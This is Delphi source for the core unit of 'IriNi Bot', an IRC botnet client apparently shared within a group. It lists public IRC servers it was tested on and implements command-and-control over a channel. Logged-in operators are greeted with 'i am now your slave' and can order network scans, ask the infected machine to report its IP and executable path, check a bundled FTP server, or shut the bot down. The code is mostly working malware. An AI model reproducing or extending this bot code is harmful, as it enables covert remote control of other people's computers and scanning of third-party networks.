{
*****************************************************************
* IRC Core source. (ONLY FOR OSC's USE/DISTRIBUTION)            *
* i modded it so it much better                                 *
* it stay on. It wont ping out from servers as some other type  *
* of bots do. Ive put some servers that it has been tested on   *
* and it works fine on them. Added some comments for those who  *
* cant tell what does what. This itself with nothing else added *
* Morpheus Work // Irini main core.                             *
*****************************************************************
}

{
        HOST                  IP            PORT
  IRC.SORCERY.NET   >> 216.122.249.75   >> 6667
  IRC.NEWNET.NET    >> 209.208.101.131  >> 6667
  IRC.EF.NET        >> 208.178.231.190  >> 6667
  IRC.ICQ.COM       >> 64.12.165.57     >> 7000
  IRC.DAL.NET       >> 212.74.101.21    >> 7000
  IRC.QUAKENET.ORG  >> 62.30.30.109     >> 6667
}

{$include def.mor}

unit main;

interface

uses
 Windows,Scanner,WinSock,sysutils,ident,config,classes,stuff,ftp,errors{$ifdef debug},logger{$endif};

var
 i:integer;
 Sock1:TSocket;
 ServerPos:Integer = 0;
 SockInfo:Sockaddr_in;
 buff:array[1..512] of char;
 Send01:string;
 StringList01:array of string;
 l,p:tstringlist;

Procedure ReadSock(const str01:String);
Procedure StartUp;
Procedure ReStart;
Procedure AddToList01(Text: string);
procedure ParseContent(Content:string);
Procedure SendPing;
Procedure SendInfo;
procedure ChangeNick;
procedure LaunchBot;

implementation

Function com(Const STR,OP:String):Boolean;
begin
  if Pos(Data.BOT_COMMAND_PREFIX+OP,STR) > 0 then result:=true
  else result:=false;
end;

{
procedure Doit(S:String);
var i:integer;
begin
for i:=1 to length(s) do
  write(inttostr(ord(S[i]))+':');
End;
}

Function RemoveChr(Const S:String):string;
var o:integer;
begin
  result:='';
  for o:=1 to length(s) do
  if s[o] <> #0 then result:=result+s[o];
end;

procedure LaunchBot;
  var ReciveString: string;
begin
  while True do
    begin
      if (recv(Sock1,buff,SizeOf(buff),0)) < 1 then  // Trys to read from socket if
        begin                                         // the Recv() comes out to be
          sleep(5000);
          Restart;                                     // then it will restart. If not
        end else                                      // then does the ReadSock procedure.
      begin
        recivestring:=recivestring+buff;
        if pos(#13#10,recivestring) > 0 then
        while pos(#13#10,recivestring) > 0 do begin
          recivestring:=removechr(recivestring); // i dont like it much because it slows it.
          //doit(copy(recivestring,1,pos(#13#10,recivestring)-1));
          readsock(copy(recivestring,1,pos(#13#10,recivestring)-1));
          delete(recivestring,1,pos(#13#10,recivestring)+1);
        end;
      ZeroMemory(@buff,sizeof(buff));
    end;
  end;
end;

Function GetParam1(str:string):String;
Var Temp:String;
begin
Temp:=Copy(Copy(str,pos(' ',str)+1,length(str)),pos(' ',Copy(str,pos(' ',str)+1,length(str)))+1,length(Copy(str,pos(' ',str)+1,length(str))));
Temp:=Copy(temp,pos(' ',temp)+1,length(temp));
If Pos(' ',Temp) > 0 Then
  Temp:=Copy(Temp,1,Pos(' ',Temp)-1)
Else
  If Pos(#13#10,Temp) > 0 Then
    delete(temp,pos(#13#10, temp),length(#13#10));
Result:=Temp;
end;

Function GetRaw(Const Qbuf:String):smallint;
Var Temp:String;
Begin
  Temp:=copy(Copy(Qbuf,Pos(' ',Qbuf)+1,Length(Qbuf)-2),1,pos(' ',Copy(Qbuf,Pos(' ',Qbuf)+1,Length(Qbuf)-2)));
  Temp:=Copy(Temp,1,Pos(' ',Temp)-1);
  if length(temp)=3 then result:=500
  else getraw:=-1;
end;

Function GetMode(Qbuf:String):String;
Var
Temp:String;
Begin
Temp:=Copy(Qbuf,Pos(' ',Qbuf)+1,Length(Qbuf)-2);
  If Pos(' ',Temp) > 0 Then
  Temp:=Copy(Temp,1,Pos(' ',Temp)-1);
Result:=Temp;
End;

Function Getuser(q:string):string;
begin
  getuser:=copy(q,2,pos('!',q)-2);
end;

Function GetHost:String;
begin
  result:=Copy(send01,pos('!',send01)+1,pos(' ',send01)-1);
end;

function ps(str8:string;Str:integer):String;  // hope this j0b is done.
var
 temp:string;
begin
  temp:=str8;
  // First clean the shit off
  Delete(Temp,1,1);
  If Pos(#13#10,Temp) > 0 Then
    Temp:=StringReplace(Temp, #13#10, '', [rfReplaceAll]);
  Temp:=Copy(Temp,Pos(':',Temp)+1,Length(Temp));
  if pos(' ',temp) > 0 then
  begin
  temp:=copy(temp,pos(' ',temp)+1,length(temp));
  Result:=spiltstr(Temp,Str);
  end
  else
    result:='';
end;

procedure ReadSock;
begin
  {$ifdef debug}
    AddToMessageLog(str01);
  {$endif}
 If Getraw(str01) <> -1 Then
  begin
    if pos('Nickname is already in use.',str01) > 0 then
      begin  //Incase nick already used. (duh!)
        sleep(1000);
        ChangeNick;
        {$ifdef debug}
          AddToMessageLog('[DEBUG] CHANGING NICK: '+Data.BOT_NICK);
        {$endif}
      end;
    if pos('Cannot join',str01) > 0 then
      begin
        {$ifdef debug}
          AddToMessageLog('[DEBUG] CANNOT JOIN CHANNEL: '+Config.Data.BOT_CHANNAL);
        {$endif}
        Sleep(5000);
        send01:='JOIN ' + Config.Data.BOT_CHANNAL + #10#13;
        send(Sock1,send01[1],Length(send01),0);
      end;
    if (getmode(str01) = '302') and data.BOT_LOOKUPADRESSS then
      begin
          // Check if we get ip or host
          if inet_addr(pchar(trim(copy(str01,pos('@',str01)+1,length(str01))))) = INADDR_NONE then
            Config.DATA.BOT_RemoteIP:=Stuff.GetIPFromHost(trim(copy(str01,pos('@',str01)+1,length(str01))))
          else
            Config.DATA.BOT_RemoteIP:=trim(copy(str01,pos('@',str01)+1,length(str01)));
      if Config.Data.BOT_RemoteIP='' then Config.Data.BOT_RemoteIP:='NONE';
      end;
    if (pos('MOTD',str01) > 0) or (GETMODE(Str01) = '376') then
      //If not connected then
      begin  //Most servers will have this. Bot will join channel when this appears.
        {$ifdef debug}
        AddToMessageLog('[DEBUG] CONNECTED TO SERVER.');
        {$endif}
        ident_kill; // stop ident
        //Config.Connected:=True;
        if data.BOT_LOOKUPADRESSS Then
        begin
          send01:='USERHOST ' + data.BOT_NICK + #10#13;
          send(Sock1,send01[1],Length(send01),0);
        end;
        send01:='JOIN ' + data.BOT_CHANNAL + #10#13;
        send(Sock1,send01[1],Length(send01),0);
      end;
  end
 else
  begin
    if getmode(str01) = 'PRIVMSG' Then
      Begin
        If com(str01,'login') Then
          begin
            i:=Find_User(GetUser(str01),GetHost);
            if (i <> -1) and not IsLogIn_User(i) then
            begin
              SendSock('Welcome '+GetUser(Str01)+' i am now your slave.');
              Login_User(I);
            end
          end
        else
          Begin
            i:=Find_User(GetUser(str01),GetHost);
            if (i <> -1) and IsLogIn_User(i) then
              Begin
                If pos('!version',str01) > 1 Then
                  begin
                  SendSock('[INFO] IriNi Bot 0.1 Beta By Morpheus.');
                  end;
                If pos('!scan',str01) > 1 Then
                  begin
                  if trim(ps(str01,1)) = '' then
                    scanner.setparams('-Q',ps(str01,2),ps(str01,3),1)
                  else
                    scanner.setparams(ps(str01,1),ps(str01,2),ps(str01,3),StrToIntDef(ps(str01,4),100));
                  end;
                If pos('!whoami',str01) > 1 Then
                  begin
                    sendsock(Config.Data.BOT_LocalIP+' '+paramstr(0));
                  end;
                If pos('!go',str01) > 1 Then
                  begin
                    halt;
                  end;
                If pos('!ftp',str01) > 1 Then
                  begin
                    if Ftp.FtpObj <> nil THen
                      sendsock('[FTP] LOCAL('+data.BOT_LocalIP+':'+inttostr(ftp.port)+') REMOTE('+data.bot_remoteip+':'+inttostr(ftp.port)+').')
                    else
                      sendsock('[FTP] NOT ACTIVE.');
                  end;
                end;
              end;
      end
    Else
      {$ifdef debug}
      if getmode(str01) = 'JOIN' Then
        Begin
          if lowercase(Getuser(Str01)) = lowercase(Data.BOT_NICK) then
            AddToMessageLog('[DEBUG] JOINED TO: '+Data.BOT_CHANNAL)
          Else
            AddToMessageLog('[DEBUG] JOIN: '+Getuser(Str01));
        End;
      {$endif}
      if getmode(str01) = 'PART' Then
        Begin
        {$ifdef debug}
          AddToMessageLog('[DEBUG] PART: '+Getuser(Str01));
        {$endif}
        i:=Find_User(GetUser(str01),GetHost);
        if i <> -1 then Logout_User(I);
        End;
      if getmode(str01) = 'NICK' Then
        Begin
        {$ifdef debug}
          AddToMessageLog('[DEBUG] NICK: '+Getuser(Str01));
        {$endif}
        i:=Find_User(GetUser(str01),GetHost);
        if i <> -1 then Logout_User(I);
        End;
      if getmode(str01) = 'QUIT' Then
        Begin
        {$ifdef debug}
          AddToMessageLog('[DEBUG] QUIT: '+Getuser(Str01));
        {$endif}
        i:=Find_User(GetUser(str01),GetHost);
        if i <> -1 then Logout_User(I);
        End;
      if pos('PING :',str01) > 0 then
        begin  //Replys to 'Server' pings.
          {$ifdef debug}
          AddToMessageLog('[DEBUG] PING? PONG!');
          {$endif}
          ParseContent(str01);
          SendPing;
          SetLength(StringList01,0);
        end;
      if getmode(str01) = 'KICK' Then
        Begin
          IF getparam1(str01) = (Data.BOT_NICK) Then
            begin
              {$ifdef debug}
                AddToMessageLog('[DEBUG] GOT KICKED FROM: '+Data.BOT_CHANNAL);
              {$endif}
              send01:='JOIN ' + data.BOT_CHANNAL + #10#13;
              send(Sock1,send01[1],Length(send01),0);
            End;
        End;
      end;
end;

procedure Startup;
 begin    //Starts the socket and trys to connect.
  if length(Data.Servers) = 0 then
  begin
    {$ifdef debug}
    AddToMessageLog('[DEBUG] NO SERVERS WERE ADDED.');
    {$endif}
  end
    else
      begin
        If ServerPos = length(Data.Servers) Then ServerPos:= 0;
        SockInfo.sin_family:=PF_INET;
        SockInfo.sin_port:=htons(StrtoIntDef(Trim(Copy(Data.Servers[ServerPos],pos(':',Data.Servers[ServerPos])+1,length(Data.Servers[ServerPos]))),6667));
        if inet_addr(Pchar(Trim(Copy(Data.Servers[ServerPos],1,pos(':',Data.Servers[ServerPos])-1)))) = INADDR_NONE Then
          begin
            {$ifdef debug}
              AddToMessageLog('[DEBUG] CONNECTING TO : ['+Trim(Copy(Data.Servers[ServerPos],1,pos(':',Data.Servers[ServerPos])-1))+':'+inttostr(StrtoIntDef(Trim(Copy(Data.Servers[ServerPos],pos(':',Data.Servers[ServerPos])+1,length(Data.Servers[ServerPos]))),6667))+']');
            {$endif}
            if not Resolve(Pchar(Trim(Copy(data.Servers[ServerPos],1,pos(':',data.Servers[ServerPos])-1))),SockInfo.sin_addr.S_addr) Then
              {$ifdef debug}
                AddToMessageLog('[DEBUG] ' + ER_005 + '[' + Trim(Copy(data.Servers[ServerPos],1,pos(':',data.Servers[ServerPos])-1)) + ']')
              {$endif}
            else
              ident_run; //Start
          end
        else
          begin
          // Ok We know its an ip.
          {$ifdef debug}
          AddToMessageLog('[DEBUG] CONNECTING TO : ['+Trim(Copy(data.Servers[ServerPos],1,pos(':',data.Servers[ServerPos])-1))+':'+inttostr(StrtoIntDef(Trim(Copy(data.Servers[ServerPos],pos(':',data.Servers[ServerPos])+1,length(data.Servers[ServerPos]))),6667))+']');
          {$endif}
          ident_run; //Start
          SockInfo.sin_addr.S_addr := inet_addr(Pchar(Trim(Copy(data.Servers[ServerPos],1,pos(':',data.Servers[ServerPos])-1))));
          end;
        Sock1:= socket(PF_INET,SOCK_STREAM,0);
        Inc(ServerPos);
        Connect(Sock1,SockInfo,sizeof(SockInfo));
      end;
 end;

Procedure Restart;
 begin     //Hence the name, restarts if it cant connect, or gets disconnected.
  Shutdown(Sock1,2);
  CloseSocket(Sock1);
  Sleep(5000);
  StartUp;
  SendInfo;
 end;

procedure ParseContent(Content:string);
 var
  i: integer;
 begin
  i := Pos(' ', Content);
   while (i > 0) do
    begin AddToList01(Copy(Content, 1, i - 1));
     Delete(Content, 1, i); i := Pos(' ', Content);
    end;
     if Length(Content) > 0 then
      AddToList01(Content);
 end;

Procedure AddToList01(Text: string);
 var
  ListLen: integer;
  Listlen2:integer;
 begin
  ListLen:= Length(StringList01);
  ListLen2:= ListLen + 1;
  SetLength(StringList01, ListLen2);
  StringList01[ListLen]:= Text;
 end;

procedure SendPing;
 begin     //The PONG reply to the server.
  send01:='PONG ' + StringList01[High(StringList01)] + #13#10;
  send(Sock1,send01[1],Length(send01),0);
 end;

procedure sendinfo;
 begin     //Info to connect. has to be sent so the server can authorize your connection.
  changenick;
  send(Sock1,send01[1],Length(send01),0);
  send01:='USER ' + data.BOT_NICK_PREFIX + ' ' + #34 + 'win2kpro' + #34 + ' ' + #34 + '127.0.0.1' + #34 + ' ' + ':' + 'MorpheusPwnz' + #13#10;
  send(Sock1,send01[1],Length(send01),0);
 end;

procedure ChangeNick;
 begin     // Duh!
  Randomize;
  Data.BOT_NICK:=Data.BOT_NICK_PREFIX+#91 + IntToStr(Random(900)+100) + #93;
  send01:='NICK '+ Data.BOT_NICK +#13#10;
  send(Sock1,send01[1],Length(send01),0);
 end;

begin

end.

